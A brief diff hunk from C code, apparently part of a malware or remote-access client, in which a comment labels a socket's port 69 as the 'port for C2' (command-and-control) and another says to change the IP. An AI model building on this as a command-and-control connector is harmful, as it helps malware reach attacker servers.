@@ -84,7 +84,7 @@ static void establishconn() {
 	// sockaddr struct, has information about socket
 
 	SOCKADDR_IN sockaddr;
-	sockaddr.sin_port = htons(69);
+	sockaddr.sin_port = htons(69); // port for C2, this might be different 
 	sockaddr.sin_family = AF_INET;
 
 	// Just change the IP
